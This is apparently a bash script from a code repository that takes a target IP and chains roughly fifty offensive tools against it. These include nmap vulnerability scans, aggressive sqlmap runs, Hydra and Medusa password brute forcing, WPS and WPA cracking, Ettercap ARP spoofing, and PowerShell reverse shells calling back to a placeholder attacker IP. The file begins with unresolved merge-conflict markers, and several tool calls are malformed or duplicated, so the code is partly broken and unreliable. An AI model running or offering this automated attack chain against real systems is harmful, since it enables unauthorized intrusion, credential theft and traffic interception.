<<<<<<< yafetyohan-patch-1

=======
                                __        _       _           _            
  __ _  __ _  __ _ _   _  __ _ / _|_   _ (_)     (_)_ __  ___| |_ __ _  __ _\
 / _` |/ _` |/ _` | | | |/ _` | |_| | | || |-----| | '_ \/ __| __/ _` |/ _` |
| (_| | (_| | (_| | |_| | (_| |  _| |_| || |-----| | | | \__ \ || (_| | (_| |
 \__,_|\__,_|\__,_|\__, |\__,_|_|  \__,_|/ |     |_|_| |_|___/\__\__,_|\__,\|
                  |___/               |__/                       |___/ 

>>>>>>> main


#!/bin/bash

# --- Initialization and Setup ---

# Check for target IP address
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <IP_Address/Domain>"
    exit 1
fi

TARGET_IP=$1
OUTPUT_DIR="results"  # Main output directory
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS_FILE="$OUTPUT_DIR/results_$TIMESTAMP.txt" # Main results log

# Create output directories if they don't exist
mkdir -p "$OUTPUT_DIR"
mkdir -p "nmap_results" #Specific output directory
mkdir -p "sqlmap_results" #Specific output directory
mkdir -p "aircrack_results" #Specific output directory
mkdir -p "reaver_results" #Specific output directory
mkdir -p "wifite_results" #Specific output directory
mkdir -p "john_results" #Specific output directory
mkdir -p "hashcat_results" #Specific output directory
mkdir -p "medusa_results" #Specific output directory
mkdir -p "metasploit_results" #Specific output directory
mkdir -p "beef_results" #Specific output directory
mkdir -p "set_results" #Specific output directory
mkdir -p "maltego_results" #Specific output directory
mkdir -p "sslscan_results" #Specific output directory
mkdir -p "httrack_results" #Specific output directory
mkdir -p "ghost_phisher_results" #Specific output directory
mkdir -p "netcat_results" #Specific output directory
mkdir -p "nishang_results" #Specific output directory
mkdir -p "pupy_results" #Specific output directory
mkdir -p "dnschef_results" #Specific output directory
mkdir -p "wireshark_results" #Specific output directory
mkdir -p "nikto_results" #Specific output directory
mkdir -p "owasp_zap_results" #Specific output directory
mkdir -p "hydra_results" #Specific output directory
mkdir -p "responder_results" #Specific output directory
mkdir -p "burp_suite_results" #Specific output directory
mkdir -p "ettercap_results" #Specific output directory
mkdir -p "netdiscover_results" #Specific output directory
mkdir -p "armitage_results" #Specific output directory
mkdir -p "kismet_results" #Specific output directory
mkdir -p "zphisher_results" #Specific output directory
mkdir -p "wifipumpkin_results" #Specific output directory
mkdir -p "dnsmasq_results" #Specific output directory
mkdir -p "sslstrip_results" #Specific output directory
mkdir -p "xsser_results" #Specific output directory
mkdir -p "powersploit_results" #Specific output directory
mkdir -p "scapy_results" #Specific output directory
mkdir -p "cewl_results" #Specific output directory
mkdir -p "mimikatz_results" #Specific output directory
mkdir -p "nessus_results" #Specific output directory
mkdir -p "kismet_results" #Specific output directory
mkdir -p "cobaltstrike_results" #Specific output directory
mkdir -p "maltego_results" #Specific output directory
mkdir -p "wireshark_results" #Specific output directory
mkdir -p "cryptcat_results" #Specific output directory
mkdir -p "snort_results" #Specific output directory
mkdir -p "macchanger_results" #Specific output directory
mkdir -p "firewall_builder_results" #Specific output directory
mkdir -p "burp_suite_results" #Specific output directory
mkdir -p "zap_proxy_results" #Specific output directory
mkdir -p "fierce_results" #Specific output directory
mkdir -p "spiderfoot_results" #Specific output directory

# --- Color Definitions (for terminal output) ---
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RED='\033[1;31m'
RESET='\033[0m'

# --- Helper Functions ---

# Log to both console and file
log() {
    local message="$1"
    echo "$message" | tee -a "$RESULTS_FILE"
}

# Run a command and log output (with optional specific output file)
run_command() {
    local command="$1"
    local description="$2"
    local outputFile="$3"

    log "${BLUE}[+] Running: ${description}${RESET}"
    if [[ -z "$outputFile" ]]; then
        eval "$command" 2>&1 | tee -a "$RESULTS_FILE"
    else
        eval "$command" 2>&1 | tee -a "$outputFile"
    fi
}
# ---- SQLMap Options ----
SQLMAP_OPTIONS=(
    "-u '$TARGET_IP' --batch --level 2 --risk 1"
    "-u '$TARGET_IP' --batch --level 3 --risk 2"
    "-u '$TARGET_IP' --batch --level 5 --risk 3"
    )
# --- Tool Execution Functions ---

# Nmap
run_nmap() {
    local option="$1"
    local description="$2"
    local outputFile="nmap_results/nmap_scan_$TIMESTAMP.txt"
    run_command "nmap $option $TARGET_IP" "Nmap: $description" "$outputFile"
}

# SQLMap
run_sqlmap() {
  local sqlmap_option="$1"
  local description="$2"
  local outputFile="sqlmap_results/sqlmap_scan_$TIMESTAMP.txt"
  run_command "sqlmap $sqlmap_option" "SQLMap: $description" "$outputFile"
}

# Aircrack-ng (Example, needs actual commands)
run_aircrack() {
    local command="$1"
    local description="$2"
    local outputFile="aircrack_results/aircrack_scan_$TIMESTAMP.txt"
    run_command "$command" "Aircrack-ng: $description" "$outputFile"
}

# Reaver (Example, needs actual commands)
run_reaver() {
    local command="$1"
    local description="$2"
    local outputFile="reaver_results/reaver_scan_$TIMESTAMP.txt"
    run_command "$command" "Reaver: $description" "$outputFile"
}
# Wifite
run_wifite() {
    local command="$1"
    local description="$2"
    local outputFile="wifite_results/wifite_scan_$TIMESTAMP.txt"
    run_command "$command" "Wifite: $description" "$outputFile"
}
# John the Ripper (Example, needs actual commands)
run_john() {
    local command="$1"
    local description="$2"
    local outputFile="john_results/john_scan_$TIMESTAMP.txt"
    run_command "$command" "John the Ripper: $description" "$outputFile"
}
# Hashcat (Example, needs actual commands)
run_hashcat() {
    local command="$1"
    local description="$2"
    local outputFile="hashcat_results/hashcat_scan_$TIMESTAMP.txt"
    run_command "$command" "Hashcat: $description" "$outputFile"
}

# Medusa (Example, needs actual commands)
run_medusa() {
    local command="$1"
    local description="$2"
    local outputFile="medusa_results/medusa_scan_$TIMESTAMP.txt"
    run_command "$command" "Medusa: $description" "$outputFile"
}
# Metasploit (Example, needs actual commands and setup)
run_metasploit() {
    local command="$1"
    local description="$2"
    local outputFile="metasploit_results/metasploit_scan_$TIMESTAMP.txt"
    run_command "$command" "Metasploit: $description" "$outputFile"
}

# BeEF (Example, needs actual commands and setup)
run_beef() {
    local command="$1"
    local description="$2"
    local outputFile="beef_results/beef_scan_$TIMESTAMP.txt"
    run_command "$command" "BeEF: $description" "$outputFile"
}

# SET (Example, needs actual commands and setup)
run_set() {
    local command="$1"
    local description="$2"
    local outputFile="set_results/set_scan_$TIMESTAMP.txt"
    run_command "$command" "SET: $description" "$outputFile"
}

# Maltego (Example, needs actual commands and setup)
run_maltego() {
    local command="$1"
    local description="$2"
    local outputFile="maltego_results/maltego_scan_$TIMESTAMP.txt"
    run_command "$command" "Maltego: $description" "$outputFile"
}

# SSLScan (Example, needs actual commands)
run_sslscan() {
    local command="$1"
    local description="$2"
    local outputFile="sslscan_results/sslscan_scan_$TIMESTAMP.txt"
    run_command "$command" "SSLScan: $description" "$outputFile"
}

# HTTrack (Example, needs actual commands)
run_httrack() {
    local command="$1"
    local description="$2"
    local outputFile="httrack_results/httrack_scan_$TIMESTAMP.txt"
    run_command "$command" "HTTrack: $description" "$outputFile"
}

# Ghost Phisher (Example, needs actual commands)
run_ghost_phisher() {
    local command="$1"
    local description="$2"
    local outputFile="ghost_phisher_results/ghost_phisher_scan_$TIMESTAMP.txt"
    run_command "$command" "Ghost Phisher: $description" "$outputFile"
}

# Netcat (Example, needs actual commands)
run_netcat() {
    local command="$1"
    local description="$2"
    local outputFile="netcat_results/netcat_scan_$TIMESTAMP.txt"
    run_command "$command" "Netcat: $description" "$outputFile"
}
# Nishang (Example, needs actual commands and setup)
run_nishang() {
    local command="$1"
    local description="$2"
    local outputFile="nishang_results/nishang_scan_$TIMESTAMP.txt"
    run_command "$command" "Nishang: $description" "$outputFile"
}
# Pupy (Example, needs actual commands and setup)
run_pupy() {
    local command="$1"
    local description="$2"
    local outputFile="pupy_results/pupy_scan_$TIMESTAMP.txt"
    run_command "$command" "Pupy: $description" "$outputFile"
}
# DnsChef (Example, needs actual commands)
run_dnschef() {
    local command="$1"
    local description="$2"
    local outputFile="dnschef_results/dnschef_scan_$TIMESTAMP.txt"
    run_command "$command" "DnsChef: $description" "$outputFile"
}

# Wireshark (Example, needs actual commands and setup)
run_wireshark() {
    local command="$1"
    local description="$2"
    local outputFile="wireshark_results/wireshark_scan_$TIMESTAMP.txt"
    run_command "$command" "Wireshark: $description" "$outputFile"
}
# Nikto (Example, needs actual commands)
run_nikto() {
    local command="$1"
    local description="$2"
    local outputFile="nikto_results/nikto_scan_$TIMESTAMP.txt"
    run_command "$command" "Nikto: $description" "$outputFile"
}
# OWASP ZAP (Example, needs actual commands and setup)
run_owasp_zap() {
    local command="$1"
    local description="$2"
    local outputFile="owasp_zap_results/owasp_zap_scan_$TIMESTAMP.txt"
    run_command "$command" "OWASP ZAP: $description" "$outputFile"
}
# Hydra (Example, needs actual commands)
run_hydra() {
    local command="$1"
    local description="$2"
    local outputFile="hydra_results/hydra_scan_$TIMESTAMP.txt"
    run_command "$command" "Hydra: $description" "$outputFile"
}
# Responder (Example, needs actual commands and setup)
run_responder() {
    local command="$1"
    local description="$2"
    local outputFile="responder_results/responder_scan_$TIMESTAMP.txt"
    run_command "$command" "Responder: $description" "$outputFile"
}
# Burp Suite (Example, needs actual commands and setup)
run_burp_suite() {
    local command="$1"
    local description="$2"
    local outputFile="burp_suite_results/burp_suite_scan_$TIMESTAMP.txt"
    run_command "$command" "Burp Suite: $description" "$outputFile"
}
# Ettercap (Example, needs actual commands)
run_ettercap() {
    local command="$1"
    local description="$2"
    local outputFile="ettercap_results/ettercap_scan_$TIMESTAMP.txt"
    run_command "$command" "Ettercap: $description" "$outputFile"
}
# Netdiscover (Example, needs actual commands)
run_netdiscover() {
    local command="$1"
    local description="$2"
    local outputFile="netdiscover_results/netdiscover_scan_$TIMESTAMP.txt"
    run_command "$command" "Netdiscover: $description" "$outputFile"
}
# Armitage (Example, needs actual commands and setup)
run_armitage() {
    local command="$1"
    local description="$2"
    local outputFile="armitage_results/armitage_scan_$TIMESTAMP.txt"
    run_command "$command" "Armitage: $description" "$outputFile"
}
# Kismet (Example, needs actual commands and setup)
run_kismet() {
    local command="$1"
    local description="$2"
    local outputFile="kismet_results/kismet_scan_$TIMESTAMP.txt"
    run_command "$command" "Kismet: $description" "$outputFile"
}
# ZPhisher (Example, needs actual commands)
run_zphisher() {
    local command="$1"
    local description="$2"
    local outputFile="zphisher_results/zphisher_scan_$TIMESTAMP.txt"
    run_command "$command" "ZPhisher: $description" "$outputFile"
}
# WIFI-Pumpkin (Example, needs actual commands)
run_wifipumpkin() {
    local command="$1"
    local description="$2"
    local outputFile="wifipumpkin_results/wifipumpkin_scan_$TIMESTAMP.txt"
    run_command "$command" "WIFI-Pumpkin: $description" "$outputFile"
}
# DNSMasq (Example, needs actual commands)
run_dnsmasq() {
    local command="$1"
    local description="$2"
    local outputFile="dnsmasq_results/dnsmasq_scan_$TIMESTAMP.txt"
    run_command "$command" "DNSMasq: $description" "$outputFile"
}

# SSLStrip (Example, needs actual commands)
run_sslstrip() {
    local command="$1"
    local description="$2"
    local outputFile="sslstrip_results/sslstrip_scan_$TIMESTAMP.txt"
    run_command "$command" "SSLStrip: $description" "$outputFile"
}
# XSSer (Example, needs actual commands)
run_xsser() {
    local command="$1"
    local description="$2"
    local outputFile="xsser_results/xsser_scan_$TIMESTAMP.txt"
    run_command "$command" "XSSer: $description" "$outputFile"
}
# Powersploit (Example, needs actual commands and setup)
run_powersploit() {
    local command="$1"
    local description="$2"
    local outputFile="powersploit_results/powersploit_scan_$TIMESTAMP.txt"
    run_command "$command" "Powersploit: $description" "$outputFile"
}
# Scapy (Example, needs actual commands)
run_scapy() {
    local command="$1"
    local description="$2"
    local outputFile="scapy_results/scapy_scan_$TIMESTAMP.txt"
    run_command "$command" "Scapy: $description" "$outputFile"
}
# Cewl (Example, needs actual commands)
run_cewl() {
    local command="$1"
    local description="$2"
    local outputFile="cewl_results/cewl_scan_$TIMESTAMP.txt"
    run_command "$command" "Cewl: $description" "$outputFile"
}
# Mimikatz (Example, needs actual commands and setup)
run_mimikatz() {
    local command="$1"
    local description="$2"
    local outputFile="mimikatz_results/mimikatz_scan_$TIMESTAMP.txt"
    run_command "$command" "Mimikatz: $description" "$outputFile"
}
# Nessus (Example, needs actual commands and setup)
run_nessus() {
    local command="$1"
    local description="$2"
    local outputFile="nessus_results/nessus_scan_$TIMESTAMP.txt"
    run_command "$command" "Nessus: $description" "$outputFile"
}
# Kismet (Example, needs actual commands and setup)
run_kismet() {
    local command="$1"
    local description="$2"
    local outputFile="kismet_results/kismet_scan_$TIMESTAMP.txt"
    run_command "$command" "Kismet: $description" "$outputFile"
}
# Cobalt Strike (Example, needs actual commands and setup)
run_cobaltstrike() {
    local command="$1"
    local description="$2"
    local outputFile="cobaltstrike_results/cobaltstrike_scan_$TIMESTAMP.txt"
    run_command "$command" "Cobalt Strike: $description" "$outputFile"
}
# Maltego (Example, needs actual commands and setup)
run_maltego() {
    local command="$1"
    local description="$2"
    local outputFile="maltego_results/maltego_scan_$TIMESTAMP.txt"
    run_command "$command" "Maltego: $description" "$outputFile"
}
# Wireshark (Example, needs actual commands and setup)
run_wireshark() {
    local command="$1"
    local description="$2"
    local outputFile="wireshark_results/wireshark_scan_$TIMESTAMP.txt"
    run_command "$command" "Wireshark: $description" "$outputFile"
}
# Cryptcat (Example, needs actual commands)
run_cryptcat() {
    local command="$1"
    local description="$2"
    local outputFile="cryptcat_results/cryptcat_scan_$TIMESTAMP.txt"
    run_command "$command" "Cryptcat: $description" "$outputFile"
}
# Snort (Example, needs actual commands and setup)
run_snort() {
    local command="$1"
    local description="$2"
    local outputFile="snort_results/snort_scan_$TIMESTAMP.txt"
    run_command "$command" "Snort: $description" "$outputFile"
}
# Macchanger (Example, needs actual commands)
run_macchanger() {
    local command="$1"
    local description="$2"
    local outputFile="macchanger_results/macchanger_scan_$TIMESTAMP.txt"
    run_command "$command" "Macchanger: $description" "$outputFile"
}
# Firewall Builder (Example, needs actual commands and setup)
run_firewall_builder() {
    local command="$1"
    local description="$2"
    local outputFile="firewall_builder_results/firewall_builder_scan_$TIMESTAMP.txt"
    run_command "$command" "Firewall Builder: $description" "$outputFile"
}
# Burp Suite (Example, needs actual commands and setup)
run_burp_suite() {
    local command="$1"
    local description="$2"
    local outputFile="burp_suite_results/burp_suite_scan_$TIMESTAMP.txt"
    run_command "$command" "Burp Suite: $description" "$outputFile"
}
# ZAP Proxy (Example, needs actual commands and setup)
run_zap_proxy() {
    local command="$1"
    local description="$2"
    local outputFile="zap_proxy_results/zap_proxy_scan_$TIMESTAMP.txt"
    run_command "$command" "ZAP Proxy: $description" "$outputFile"
}
# Fierce (Example, needs actual commands)
run_fierce() {
    local command="$1"
    local description="$2"
    local outputFile="fierce_results/fierce_scan_$TIMESTAMP.txt"
    run_command "$command" "Fierce: $description" "$outputFile"
}
# SpiderFoot (Example, needs actual commands and setup)
run_spiderfoot() {
    local command="$1"
    local description="$2"
    local outputFile="spiderfoot_results/spiderfoot_scan_$TIMESTAMP.txt"
    run_command "$command" "SpiderFoot: $description" "$outputFile"
}
# --- Main Execution ---

log "${GREEN}Starting Full Security Scan on: ${TARGET_IP}${RESET}"

# 1. Nmap Scans - Basic and Comprehensive
run_nmap "-sS -sV -T4 -p- --open" "TCP SYN Scan with Version Detection (All Ports, Only Open)"
run_nmap "-A" "Aggressive Scan"
run_nmap "-p- -sS -sV -sC -A -O --script vuln" "Comprehensive Scan with Vulnerability Checks (All Ports)"

# 2. SQLMap Scans - Multiple levels
for option in "${SQLMAP_OPTIONS[@]}"; do
    run_sqlmap "$option" "SQLMap Scan with Options: $option"
done

# 3. Aircrack-ng (Example - Replace with actual commands)
run_aircrack "aircrack-ng -w /usr/share/wordlists/rockyou.txt -e 'TargetSSID' /path/to/capture.cap" "Aircrack-ng Dictionary Attack (Example)"

# 4. Reaver (Example - Replace with actual commands)
run_reaver "-i wlan0 -b XX:XX:XX:XX:XX:XX -c 1 -vv" "Reaver WPS Attack (Example)"
# 5. Wifite (Example - Replace with actual commands)
run_wifite "-i wlan0 --wpa --dict /usr/share/wordlists/rockyou.txt" "Wifite WPA/WPA2 Cracking (Example)"

# 6. John the Ripper (Example - Replace with actual commands)
run_john "--wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 /path/to/hashfile.txt" "John the Ripper Hash Cracking (Example)"

# 7. Hashcat (Example - Replace with actual commands)
run_hashcat "-m 0 -a 0 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt" "Hashcat Password Cracking (Example)"

# 8. Medusa (Example - Replace with actual commands)
run_medusa "-h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh" "Medusa SSH Brute-Force (Example)"

# 9. Metasploit Framework (Example - Requires proper setup)
run_metasploit "msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS $TARGET_IP; set PORTS 22,80,443; run; exit'" "Metasploit Port Scan (Example)"

# 10. BeEF (Browser Exploitation Framework - Requires setup)
run_beef "beef-xss" "BeEF Framework - Needs configuration" # This is a placeholder

# 11. Social-Engineer Toolkit (SET - Requires setup)
run_set "setoolkit" "Social Engineer Toolkit (SET) - Needs configuration" # Placeholder

# 12. Maltego (Requires proper setup)
run_maltego "maltego" "Maltego - Needs configuration" # Placeholder
# 13. SSLScan
run_sslscan "$TARGET_IP" "SSLScan (Basic)"

# 14. HTTrack
run_httrack "httrack $TARGET_IP -O ./httrack_results" "HTTrack - Download website"
# 15. Ghost Phisher
run_ghost_phisher "ghost-phisher" "Ghost Phisher - Needs Configuration"

# 16. Netcat
run_netcat "nc -zv $TARGET_IP 22 80 443" "Netcat Port Check (Example)"

# 17. Nishang (Requires PowerShell setup)
run_nishang "powershell -c 'Invoke-PowerShellTcp -Reverse -IPAddress <Your IP> -Port 4444'" "Nishang Reverse Shell (Example - Needs setup)"

# 18. Pupy (Requires setup)
run_pupy "pupygen" "Pupy - Needs Configuration" #Placeholder

# 19. DnsChef
run_dnschef "--fakeip 127.0.0.1 --fakedomain $TARGET_IP" "DnsChef (Example - needs config)"
# 20. Wireshark (Example, needs actual commands and setup)
run_wireshark "wireshark" "Wireshark (Needs to be run manually)" #Placeholder

# 21. Kali Linux Tools (Example - general mention)
log "${BLUE}[+] Running Kali Linux Tools (General Use - Manual Interaction Needed)${RESET}"

# 22. Nikto
run_nikto "-h $TARGET_IP" "Nikto Web Server Scan"

# 23. OWASP ZAP (Example, needs actual commands and setup)
run_owasp_zap "zap.sh -cmd -quickurl $TARGET_IP" "OWASP ZAP Quick Scan (Example)"
# 24. Hydra
run_hydra "-l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP http-get /" "Hydra HTTP Login Bruteforce"

# 25. Responder (Requires network setup and proper use)
run_responder "-i eth0" "Responder - Requires network setup and caution" #Placeholder

# 26. Burp Suite (Requires proper setup)
run_burp_suite "burpsuite" "Burp Suite - Needs configuration and manual use" # Placeholder

# 27. Ettercap (Requires network setup and caution)
run_ettercap "-T -q -M arp:eth0/$TARGET_IP/ $TARGET_IP" "Ettercap ARP Spoof (Example - Needs setup)"
# 28. Netdiscover
run_netdiscover "-r $TARGET_IP/24" "Netdiscover Network Scan"

# 29. Armitage (Requires proper setup)
run_armitage "armitage" "Armitage - Needs configuration" # Placeholder

# 30. BeEF Framework
run_beef "beef-xss" "BeEF Framework - Needs Configuration" # Placeholder

# 31. Kismet
run_kismet "kismet" "Kismet - Needs Configuration" # Placeholder
# 32. ZPhisher
run_zphisher "zphisher" "ZPhisher - Needs Configuration" # Placeholder
# 33. WIFI-Pumpkin
run_wifipumpkin "wifi-pumpkin" "WIFI-Pumpkin - Needs Configuration" # Placeholder

# 34. DNSMasq (Example)
run_dnsmasq "dnsmasq --dhcp-range=192.168.1.100,192.168.1.200 --dhcp-leasefile=/tmp/dnsmasq.leases --dhcp-lease-max=150 --interface=eth0 --dhcp-option=3,192.168.1.1 --dhcp-option=6,8.8.8.8,8.8.4.4" "DNSMasq - Needs Configuration" # Placeholder

# 35. SSLStrip (Example)
run_sslstrip "sslstrip -p" "SSLStrip - Needs configuration" # Placeholder

# 36. XSSer
run_xsser "$TARGET_IP" "XSSer - Needs Configuration" # Placeholder
# 37. Powersploit (Example, needs setup and a target)
run_powersploit "powershell -c 'Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <Your IP> -Port 4444'" "Powersploit - Needs Configuration"

# 38. Scapy (Example - needs to be run manually, likely interactive)
log "${BLUE}[+] Running Scapy (Manual Execution Recommended)${RESET}"
log "  -  Start Scapy: scapy"
log "  -  Example:  sr1(IP(dst=\"$TARGET_IP\")/TCP(dport=80,flags=\"S\"))"
log "  -  Check https://scapy.net/ for full manual"

# 39. Cewl
run_cewl "$TARGET_IP -d 2 -m 5 -w /tmp/cewl_wordlist.txt" "Cewl: Web Crawler Wordlist"
# 40. Mimikatz (Requires a Windows target and setup)
run_mimikatz "mimikatz.exe" "Mimikatz - Requires Windows Target and Configuration" # Placeholder
# 41. Nessus (Requires Nessus installation and setup)
run_nessus "nessuscli scan new $TARGET_IP" "Nessus - Needs Configuration" # Placeholder
# 42. Kismet
run_kismet "kismet" "Kismet - Needs Configuration" # Placeholder

# 43. Cobalt Strike (Requires Cobalt Strike installation and setup)
run_cobaltstrike "cobaltstrike" "Cobalt Strike - Needs Configuration" # Placeholder

# 44. Maltego (Requires proper setup)
run_maltego "maltego" "Maltego - Needs configuration" # Placeholder

# 45. Wireshark
run_wireshark "wireshark" "Wireshark - Needs Configuration" # Placeholder

# 46. Cryptcat
run_cryptcat "cryptcat -l -p 4444" "Cryptcat - Needs Configuration" # Placeholder

# 47. Snort
run_snort "snort -c /etc/snort/snort.conf -i eth0" "Snort - Needs Configuration" # Placeholder
# 48. Macchanger
run_macchanger "-r eth0" "Macchanger: Randomizing MAC Address (eth0)"

# 49. Firewall Builder
run_firewall_builder "fwbuilder" "Firewall Builder - Needs Configuration" # Placeholder

# 50. Burp Suite
run_burp_suite "burpsuite" "Burp Suite - Needs Configuration" # Placeholder

# 51. ZAP Proxy
run_zap_proxy "zap.sh -cmd -quickurl $TARGET_IP" "ZAP Proxy - Web Security"
# 52. Fierce
run_fierce "-dns $TARGET_IP" "Fierce DNS Enumeration"
# 53. SpiderFoot
run_spiderfoot "$TARGET_IP" "SpiderFoot - OSINT"

# --- Information Gathering and Summary ---
log "${GREEN}------------------- Information Gathering and Summary -------------------${RESET}"

# IP Addresses (from various tools - this is where you'd parse logs)
ip_addresses=$(grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" "$RESULTS_FILE" | sort -u)
if [[ -n "$ip_addresses" ]]; then
    log "${YELLOW}[+] IP Addresses Found: ${ip_addresses}${RESET}"
fi

# Subdomains (Example - modify based on actual output parsing)
subdomains=$(grep -oP '(?i)\b[a-z0-9.-]+\.'"$TARGET_IP"'\b' "$RESULTS_FILE" | sort -u)
if [[ -n "$subdomains" ]]; then
    log "${YELLOW}[+] Subdomains Discovered: ${subdomains}${RESET}"
fi

# Emails (Example - modify based on actual output parsing)
emails=$(grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$RESULTS_FILE" | sort -u)
if [[ -n "$emails" ]]; then
    log "${YELLOW}[+] Emails Collected: ${emails}${RESET}"
fi

# Phone Numbers (Example - modify based on actual output parsing, might need a regex)
phone_numbers=$(grep -oE "(\+\d{1,2}\s?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}" "$RESULTS_FILE" | sort -u)
if [[ -n "$phone_numbers" ]]; then
    log "${YELLOW}[+] Possible Phone Numbers: ${phone_numbers}${RESET}"
fi

# Usernames (Example - modify based on actual output parsing)
usernames=$(grep -oE "\b[a-zA-Z0-9._-]+\b" "$RESULTS_FILE" | grep -E -v "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u) # basic filtering
if [[ -n "$usernames" ]]; then
    log "${YELLOW}[+] Usernames Found: ${usernames}${RESET}"
fi

# Passwords (Example - this is DANGEROUS, be careful, and parse ONLY from your authorized tools!)
passwords=$(grep -oE "password|pass|secret|pwd" "$RESULTS_FILE" | sort -u) #very simple
if [[ -n "$passwords" ]]; then
    log "${RED}[!] Potential Passwords (Review with CAUTION!): ${passwords}${RESET}"
fi

# Open Ports and Services (from Nmap) - More robust parsing needed
ports=$(grep -E "open" "$RESULTS_FILE" | awk '{print $1, $2, $3}' | sort -u)
if [[ -n "$ports" ]]; then
    log "${CYAN}[+] Open Ports and Services
